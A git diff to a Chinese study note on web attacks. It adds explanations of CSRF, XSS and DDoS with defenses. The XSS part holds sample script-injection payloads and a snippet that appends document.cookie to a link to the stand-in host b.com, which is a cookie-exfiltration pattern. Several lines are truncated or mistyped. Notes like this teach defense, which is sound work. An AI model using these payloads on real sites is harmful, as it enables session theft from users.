@@ -21,10 +21,12 @@ tags: http
     - 此时A保持登录状态，另起一个窗口打开B站点，站点B接收到用户请求后，返回一些攻击代码请求A的资源
     - 浏览器执行恶意代码，在用户不知情情况下携带cookie等用户验证信息，向A发起请求，导致来自B的恶意代码被执行
     - 代码
-        ```java
-            a.com/a.php?user="hhj"&pwd="j" // 1  
-            a.com/ // 2 
-        ``` 
+    ```JavaScript
+        <script>
+            var a = `a.com/a.php?user="hhj"&pwd="j"`;
+            var b = `b.com`;
+        </script> 
+    ```
     - 防御
         - 重要数据交互采用post进行接受
         - 使用验证码
@@ -32,8 +34,45 @@ tags: http
         - 为每个表单添加Token并验证
 
 ## xss
+- Cross-Site Scripting（跨站脚本攻击），防止与css一样，用xss；指攻击者在页面里插入而已script代码，当用户浏览页面时，嵌入其中的恶意代码会被执行
+- 攻击方式
+    - 发出请求时，xss代码出现在url中，作为输出会被提交并解析后响应，最后返回给浏览器，浏览器解析执行xss代码
+    ```JavaScript
+        <script>
+            var url = `a.com?send="<script>alert('xss test')<script>"`; // 里面的xss test会被执行
+            var url = `a.com?send="<script type='text/script' src='src/xss.js'><script>"`; // 执行这段js
+        </script>
+    ```
+    - 表单存到数据库的时候，攻击者会将恶意代码保存至数据库，后面客户端执行至这段代码会被恶意执行
+    ```html
+        <input type="text" value="<script>alert('xss test')</script>" /> 
+        <!-- 保存至数据库，后面从数据库拉去数据在页面执行的时候，会恶意执行 -->
+        <input type="text" value="<div>破坏布局，伪造页面效果</div>" /> 
+        <input type="text" value="#123" />
+        <!-- php中的#会被当成注释、如其他里面可以试试// || /**/ -->
+        <sctipt>
+            var s = document.cookie, h = document.createElement('a');
+            h.href = "b.com?"+ s;
+            h.innerHtml = '<img src="../xss.png">';
+            document.body.appendChild(h);
+        </script>
+    ```
+    - 
+- 防御
+    - “所有的输入都是有害的”：对输入数据进行过滤
+        - 对数据进行html encode处理
+        - 对一些特殊符号进行转义，例如<script>、<iframe>、&lt < 、&gt >、
+        - 过滤js事件的标签，例如onclick、onfoucus
+    - 将重要的cookie标记为http only，这样页面上js的document.cookie语气就不能获取到cookie
+    - 对数据
+    - 服务器段对输入的数据进行xss clean处理
 
 ## ddos
+- distributed Denial Of Service（分布式拒绝服务攻击）
+- 通过大量合法请求占用大量资源，以达到瘫痪网络的目的。
+    - 通过向服务器提交大量请求，使服务器超负荷
+    - 阻断某服务与特定系统或个人的通讯
+    - ip欺骗是
 
 ## sql注入
 
@@ -41,3 +80,5 @@ tags: http
 
 ## 参考链接
 - [cors.csrf](https://yq.aliyun.com/articles/69313)
+- [xss](https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label3)
+- [ddos](https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB)
